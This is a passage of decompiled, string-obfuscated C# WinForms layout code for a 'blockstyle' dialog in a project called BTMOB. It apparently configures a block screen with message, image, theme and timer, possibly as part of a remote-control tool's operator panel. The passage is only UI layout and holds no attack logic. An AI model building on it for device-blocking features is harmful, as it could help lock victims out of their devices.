using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class blockstyle : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("msgtitle")]
	private DrakeUILabel _msgtitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nobtn")]
	private DrakeUIButtonIcon _nobtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("okbtn")]
	private DrakeUIButtonIcon _okbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboblock")]
	private DrakeUIComboBox _comboblock;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("timerduration")]
	private DrakeUITextBox _timerduration;

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUILabel msgtitle
	{
		[CompilerGenerated]
		get
		{
			return _msgtitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = msgtitle_MouseDown;
			DrakeUILabel drakeUILabel = _msgtitle;
			if (drakeUILabel != null)
			{
				drakeUILabel.MouseDown -= value2;
			}
			_msgtitle = value;
			drakeUILabel = _msgtitle;
			if (drakeUILabel != null)
			{
				drakeUILabel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("toppanel")]
	internal virtual Panel toppanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W7")]
	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon nobtn
	{
		[CompilerGenerated]
		get
		{
			return _nobtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nobtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nobtn = value;
			drakeUIButtonIcon = _nobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W1")]
	internal virtual DrakeWidth_W DrakeWidth_W1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon okbtn
	{
		[CompilerGenerated]
		get
		{
			return _okbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = okbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _okbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_okbtn = value;
			drakeUIButtonIcon = _okbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel2
	{
		[CompilerGenerated]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel2_MouseDown;
			Panel panel = _Panel2;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel2 = value;
			panel = _Panel2;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("inputtext2")]
	internal virtual DrakeUITextBox inputtext2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W8")]
	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboblock
	{
		[CompilerGenerated]
		get
		{
			return _comboblock;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboblock_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboblock;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboblock = value;
			drakeUIComboBox = _comboblock;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("blackthemetxt")]
	internal virtual DrakeUIButtonIcon blackthemetxt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("blockmsgstr")]
	internal virtual DrakeUIButtonIcon blockmsgstr
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIButtonIcon2")]
	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("descrptiontext")]
	internal virtual DrakeUITextBox descrptiontext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("imgbox")]
	internal virtual PictureBox imgbox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("custompanel")]
	internal virtual Panel custompanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkshowtimer")]
	internal virtual DrakeUICheckBox checkshowtimer
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("paneltimer")]
	internal virtual Panel paneltimer
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox timerduration
	{
		[CompilerGenerated]
		get
		{
			return _timerduration;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = timerduration_TextChanged;
			KeyPressEventHandler value3 = timerduration_KeyPress;
			DrakeUITextBox drakeUITextBox = _timerduration;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
				drakeUITextBox.KeyPress -= value3;
			}
			_timerduration = value;
			drakeUITextBox = _timerduration;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
				drakeUITextBox.KeyPress += value3;
			}
		}
	}

	[field: AccessedThroughProperty("combotimers")]
	internal virtual DrakeUIComboBox combotimers
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public blockstyle()
	{
		base.Load += blockstyle_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.blockstyle));
		this.Panel4 = new System.Windows.Forms.Panel();
		this.msgtitle = new DrakeUI.Framework.DrakeUILabel();
		this.toppanel = new System.Windows.Forms.Panel();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.nobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W1 = new DrakeUI.Framework.DrakeWidth_W();
		this.okbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.inputtext2 = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.custompanel = new System.Windows.Forms.Panel();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.descrptiontext = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.imgbox = new System.Windows.Forms.PictureBox();
		this.paneltimer = new System.Windows.Forms.Panel();
		this.checkshowtimer = new DrakeUI.Framework.DrakeUICheckBox();
		this.timerduration = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.combotimers = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.blockmsgstr = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.blackthemetxt = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.comboblock = new DrakeUI.Framework.DrakeUIComboBox();
		this.DrakeWidth_W8 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel4.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.custompanel.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel7.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.imgbox).BeginInit();
		this.paneltimer.SuspendLayout();
		this.Panel5.SuspendLayout();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.Panel4.Controls.Add(this.msgtitle);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(1, 2);
		this.Panel4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel4.Name = EXGuarder._3862361F;
		this.Panel4.Size = new System.Drawing.Size(745, 42);
		this.Panel4.TabIndex = 39;
		this.msgtitle.Dock = System.Windows.Forms.DockStyle.Top;
		this.msgtitle.Font = new System.Drawing.Font(EXGuarder._26602A17, 10f, System.Drawing.FontStyle.Bold);
		this.msgtitle.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.msgtitle.Location = new System.Drawing.Point(0, 0);
		this.msgtitle.Name = EXGuarder._5C561D30;
		this.msgtitle.Padding = new System.Windows.Forms.Padding(5);
		this.msgtitle.Size = new System.Drawing.Size(745, 42);
		this.msgtitle.Style = DrakeUI.Framework.UIStyle.Custom;
		this.msgtitle.TabIndex = 2;
		this.msgtitle.Text = EXGuarder._59703D3D;
		this.msgtitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.toppanel.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.toppanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.toppanel.Location = new System.Drawing.Point(1, 0);
		this.toppanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.toppanel.Name = EXGuarder._29295C48;
		this.toppanel.Size = new System.Drawing.Size(745, 2);
		this.toppanel.TabIndex = 40;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(746, 0);
		this.DrakeWidth_W5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W5.Name = EXGuarder._26600E21;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(1, 370);
		this.DrakeWidth_W5.TabIndex = 45;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W7.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W7.Name = EXGuarder._533A7849;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(1, 370);
		this.DrakeWidth_W7.TabIndex = 47;
		this.nobtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nobtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.nobtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.nobtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nobtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.Location = new System.Drawing.Point(481, 5);
		this.nobtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.nobtn.Name = EXGuarder._52231B56;
		this.nobtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nobtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nobtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nobtn.Size = new System.Drawing.Size(111, 43);
		this.nobtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nobtn.Symbol = 61453;
		this.nobtn.TabIndex = 3;
		this.nobtn.Text = EXGuarder._17500D19;
		this.DrakeWidth_W1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W1.Location = new System.Drawing.Point(592, 5);
		this.DrakeWidth_W1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W1.Name = EXGuarder._355C3B0E;
		this.DrakeWidth_W1.Size = new System.Drawing.Size(28, 43);
		this.DrakeWidth_W1.TabIndex = 5;
		this.okbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.okbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.okbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillDisableColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.okbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.okbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.Location = new System.Drawing.Point(620, 5);
		this.okbtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.okbtn.Name = EXGuarder._41641879;
		this.okbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.okbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.okbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.okbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.okbtn.Size = new System.Drawing.Size(111, 43);
		this.okbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.okbtn.TabIndex = 2;
		this.okbtn.Text = EXGuarder._61516512;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(731, 5);
		this.DrakeWidth_W3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W3.Name = EXGuarder._6F2F0966;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(11, 43);
		this.DrakeWidth_W3.TabIndex = 6;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(0, 370);
		this.DrakeWidth_W4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W4.Name = EXGuarder._21247050;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(747, 1);
		this.DrakeWidth_W4.TabIndex = 44;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.nobtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W1);
		this.Panel2.Controls.Add(this.okbtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W3);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(0, 371);
		this.Panel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel2.Name = EXGuarder._41001B3F;
		this.Panel2.Padding = new System.Windows.Forms.Padding(5);
		this.Panel2.Size = new System.Drawing.Size(747, 53);
		this.Panel2.TabIndex = 41;
		this.inputtext2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext2.Dock = System.Windows.Forms.DockStyle.Right;
		this.inputtext2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext2.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext2.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f);
		this.inputtext2.ForeColor = System.Drawing.Color.White;
		this.inputtext2.Location = new System.Drawing.Point(386, 8);
		this.inputtext2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.inputtext2.Maximum = 2147483647.0;
		this.inputtext2.Minimum = -2147483648.0;
		this.inputtext2.Name = EXGuarder._6F510B4D;
		this.inputtext2.Padding = new System.Windows.Forms.Padding(5);
		this.inputtext2.Radius = 15;
		this.inputtext2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext2.Size = new System.Drawing.Size(351, 25);
		this.inputtext2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext2.TabIndex = 18;
		this.inputtext2.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext2.Watermark = EXGuarder._5A193A6C;
		this.Panel3.Controls.Add(this.custompanel);
		this.Panel3.Controls.Add(this.paneltimer);
		this.Panel3.Controls.Add(this.Panel5);
		this.Panel3.Controls.Add(this.Panel1);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(1, 44);
		this.Panel3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel3.Name = EXGuarder._096D0D42;
		this.Panel3.Size = new System.Drawing.Size(745, 326);
		this.Panel3.TabIndex = 43;
		this.custompanel.Controls.Add(this.Panel6);
		this.custompanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.custompanel.Location = new System.Drawing.Point(0, 120);
		this.custompanel.Margin = new System.Windows.Forms.Padding(4);
		this.custompanel.Name = EXGuarder._51436F28;
		this.custompanel.Size = new System.Drawing.Size(745, 206);
		this.custompanel.TabIndex = 44;
		this.custompanel.Visible = false;
		this.Panel6.Controls.Add(this.descrptiontext);
		this.Panel6.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel6.Controls.Add(this.Panel7);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel6.Location = new System.Drawing.Point(0, 0);
		this.Panel6.Name = EXGuarder._082D1643;
		this.Panel6.Padding = new System.Windows.Forms.Padding(8);
		this.Panel6.Size = new System.Drawing.Size(745, 206);
		this.Panel6.TabIndex = 44;
		this.descrptiontext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.descrptiontext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.descrptiontext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.descrptiontext.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.descrptiontext.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f);
		this.descrptiontext.ForeColor = System.Drawing.Color.White;
		this.descrptiontext.Location = new System.Drawing.Point(8, 34);
		this.descrptiontext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.descrptiontext.Maximum = 2147483647.0;
		this.descrptiontext.Minimum = -2147483648.0;
		this.descrptiontext.Multiline = true;
		this.descrptiontext.Name = EXGuarder._20360229;
		this.descrptiontext.Padding = new System.Windows.Forms.Padding(5);
		this.descrptiontext.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.descrptiontext.RectColor = System.Drawing.Color.Gray;
		this.descrptiontext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.descrptiontext.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.descrptiontext.Size = new System.Drawing.Size(590, 164);
		this.descrptiontext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.descrptiontext.TabIndex = 42;
		this.descrptiontext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.descrptiontext.Watermark = EXGuarder._5A193A6C;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.DrakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(8, 8);
		this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeUIButtonIcon2.Name = EXGuarder._54431B79;
		this.DrakeUIButtonIcon2.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(590, 26);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 0;
		this.DrakeUIButtonIcon2.TabIndex = 43;
		this.DrakeUIButtonIcon2.Text = EXGuarder._3A256703;
		this.DrakeUIButtonIcon2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel7.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel7.Controls.Add(this.imgbox);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel7.Location = new System.Drawing.Point(598, 8);
		this.Panel7.Name = EXGuarder._675A0030;
		this.Panel7.Padding = new System.Windows.Forms.Padding(5);
		this.Panel7.Size = new System.Drawing.Size(139, 190);
		this.Panel7.TabIndex = 2;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(5, 127);
		this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeUIButtonIcon1.Name = EXGuarder._35727403;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(129, 58);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61502;
		this.DrakeUIButtonIcon1.SymbolSize = 21;
		this.DrakeUIButtonIcon1.TabIndex = 41;
		this.DrakeUIButtonIcon1.Text = EXGuarder._332D4031;
		this.imgbox.Dock = System.Windows.Forms.DockStyle.Top;
		this.imgbox.Location = new System.Drawing.Point(5, 5);
		this.imgbox.Margin = new System.Windows.Forms.Padding(4);
		this.imgbox.Name = EXGuarder._0B300079;
		this.imgbox.Size = new System.Drawing.Size(129, 122);
		this.imgbox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.imgbox.TabIndex = 40;
		this.imgbox.TabStop = false;
		this.paneltimer.Controls.Add(this.checkshowtimer);
